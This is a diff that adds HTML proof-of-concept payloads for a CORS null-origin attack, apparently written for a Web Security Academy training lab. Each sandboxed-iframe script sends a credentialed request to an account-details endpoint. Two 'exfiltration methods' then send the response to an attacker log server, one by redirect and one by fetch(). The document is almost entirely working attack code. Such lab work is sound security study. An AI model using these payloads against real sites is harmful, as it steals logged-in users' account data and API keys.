@@ -1,3 +1,24 @@
+
+<!-- POC Script-->
+<!-- Vulnerable Endpoint = https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails -->
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails',true);
+  req.withCredentials = true;
+  req.send();
+  function reqListener() {
+    document.write(this.responseText);
+  };
+</script>"></iframe>
+
+
+<!-- Data Exfiltration  Method 1 -->
+<!-- Attacker Server = https://exploit-ac5e1f871eff47b4c0792dbf01370018.web-security-academy.net/log -->
+<!-- Vulnerable Endpoint = https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails -->
+
+
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
@@ -6,5 +27,20 @@
   req.send();
   function reqListener() {
     location='https://exploit-ac5e1f871eff47b4c0792dbf01370018.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
+  };
+</script>"></iframe>
+
+<!-- Data Exfiltration  Method 2 -->
+<!-- Attacker Server = https://exploit-ac5e1f871eff47b4c0792dbf01370018.web-security-academy.net/log -->
+<!-- Vulnerable Endpoint = https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails -->
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','https://acb41f971eb847c3c0de2da500830064.web-security-academy.net/accountDetails',true);
+  req.withCredentials = true;
+  req.send();
+  function reqListener() {
+    fetch('https://exploit-ac5e1f871eff47b4c0792dbf01370018.web-security-academy.net/log?key='+encodeURIComponent(this.responseText))
   };
 </script>"></iframe>
